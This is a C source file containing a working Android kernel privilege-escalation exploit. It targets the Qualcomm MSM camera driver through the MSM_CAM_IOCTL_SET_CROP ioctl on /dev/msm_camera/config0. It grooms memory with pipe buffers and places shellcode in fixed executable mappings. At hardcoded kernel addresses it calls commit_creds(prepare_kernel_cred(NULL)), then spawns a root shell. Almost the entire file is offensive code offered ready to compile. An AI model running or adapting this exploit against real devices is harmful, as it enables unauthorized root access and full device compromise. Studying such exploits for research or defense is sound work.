/*
** Copyright 2016, Edward Hung (@betalphafai)
**
** Licensed under the Apache License, Version 2.0 (the "License");
** you may not use this file except in compliance with the License.
** You may obtain a copy of the License at
**
**     http://www.apache.org/licenses/LICENSE-2.0
**
** Unless required by applicable law or agreed to in writing, software
** distributed under the License is distributed on an "AS IS" BASIS,
** WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
** See the License for the specific language governing permissions and
** limitations under the License.
*/


#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>

#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/system_properties.h>
#include <sys/uio.h>
#include <sys/wait.h>

#include <arpa/inet.h>

#include <linux/types.h>
#include <linux/ioctl.h>

#include <android/log.h>

struct crop_info {
    void *info;
    int len;
};

#define MSM_CAM_IOCTL_MAGIC 'm'
#define MSM_CAM_IOCTL_SET_CROP \
    _IOW(MSM_CAM_IOCTL_MAGIC, 18, struct crop_info *)

#define MAP_LEN 0x1000
unsigned long map_addr = { 0l };
struct crop_info ci = { 0 };
#define F_SETPIPE_SZ 0x407
#define F_GETPIPE_SZ 0x408
#define PIPE_NUM 32
int pfd[PIPE_NUM][2] = { 0 };
int fd = {0};

struct cred
{

};
struct task_struct
{

};


int fake_read(int fd, char *buf, int cnt)
{
    int (*commit_creds)(struct cred *) = (int (*)(struct cred *))0xc00b7140;
    struct cred * (*prepare_kernel_cred)(struct task_struct *) = (struct cred * (*)(struct task_struct *))0xc00b7854;

    if (commit_creds && prepare_kernel_cred)
    {
        commit_creds(prepare_kernel_cred(NULL));
    }

    errno = 0x404;
    return 0x404;
}

unsigned long fake_syscall[6] =
{
    0xe92d4010,
    0xe3a00000,
    0xe59f4004,
    0xe12fff34,
    0xe8bd8010,
    /* 0xe8bd8010 */
    (unsigned long)fake_read
};


int main(int argc, char const *argv[], char const *envp[])
{
    int ret = 0;
    unsigned long data = 0l;
    int i = 0;
    int j = 0;
    pthread_t thread = 0;
    char buf[4] = { 0 };
    int exploit = 0;
    int pid = 0;

    unsigned long shellcode = 0l;

    printf("[+] main=%x\n", (unsigned)main);
    // printf("fake_read=%x\n", (unsigned)fake_read);
    printf("[+] uid=%d gid=%d\n", getuid(), getgid());

    printf("[+] mmap shellcode\n");
    shellcode = (unsigned long)mmap((void *)0x400000, MAP_LEN,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    if (shellcode == -1)
    {
        perror("[-] mmap");
        return 0;
    }
    for (i = 0; i < 6; ++i)
        *(unsigned long *)(shellcode + i * sizeof(unsigned long)) = fake_syscall[i];
    // for (i = 0; i < 6; ++i)
    //     printf("[+] %x=%lx\n", i, *(unsigned long *)(shellcode + i * sizeof(unsigned long)));
    // return 0;
    data = (unsigned long)mmap((void *)0x4000000, MAP_LEN,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    if (data == -1)
    {
        perror("[-] mmap");
        return 0;
    }
    for (i = 0; i < MAP_LEN / sizeof(unsigned long); ++i)
        *(unsigned long *)(data + i * sizeof(unsigned long)) = (unsigned long)0xdeadbeef;
    *(unsigned long *)(data + 0xc) = (unsigned long)data;
    *(unsigned long *)(data + 0x10) = (unsigned long)shellcode;

    // for (int i = 0; i < 8; ++i)
    // {
    //     printf("[+] %lx=%lx\n",
    //         data + i * sizeof(unsigned long),
    //         *(unsigned long *)(data + i * sizeof(unsigned long)));
    // }

    fd = open("/dev/msm_camera/config0", O_RDONLY);
    printf("[+] open \"/dev/msm_camera/config0\", fd=%d\n", fd);
    if (fd < 0)
    {
        perror("[-] fd");
        return 0;
    }
    for (i = 0; i < PIPE_NUM; ++i)
    {
        if (pipe(pfd[i]) < 0)
        {
            perror("[-] pipe");
            return -1;
        }
    }
    for (i = 0; i < PIPE_NUM; ++i)
        close(pfd[i][1]);

    printf("[+] start the dangerous thing\n");
    for (i = 0; i < PIPE_NUM; ++i)
    {
        errno = 0;
        ci.info = (void *)0xdeadbeef;
        ci.len = 24;
        ret = ioctl(fd, MSM_CAM_IOCTL_SET_CROP, &ci);
        // printf("[+] ioctl %d %d %d %s\n", i, ret, errno, strerror(errno));

        errno = 0;
        ret = fcntl(pfd[i][0], F_SETPIPE_SZ, 0x1000);
        // printf("[+] fcntl %d %d %d\n", i, ret, errno);
        // ret = fcntl(pfd[i][0], F_GETPIPE_SZ);
        // printf("[+] fcntl %d %d %d\n", i, ret, errno);

        errno = 0;
        ci.info = (void *)data;
        ci.len = 24;
        ret = ioctl(fd, MSM_CAM_IOCTL_SET_CROP, &ci);
        // printf("[+] ioctl %d %d %d\n", i, ret, errno);

        errno = 0;
        ret = close(pfd[i][0]);
        printf("[+] close %d %d %d\n", i, ret, errno);
        if (errno == 0x404)
        {
            exploit = 1;
            printf("[+] exploited!\n");
            printf("[+] uid=%d gid=%d\n", getuid(), getgid());
            pid = fork();
            if (pid == 0)
            {
                system("sh");
                exit(-1);
            }
            waitpid(pid, 0, 0);
            break;
        }
    }
    if (exploit == 0)
    {
        printf("[-] exploit failed\n");
        close(fd);
        exit(-1);
    }

#if 1
    errno = 0;
    // ret = close(pfd[1]);
    // printf("[+] close ret=%d %d\n", ret, errno);
    for (i = 0; i < PIPE_NUM; ++i)
    {
        // close pipe
    }

#endif
    // return 0;


    close(fd);
    return 0;
}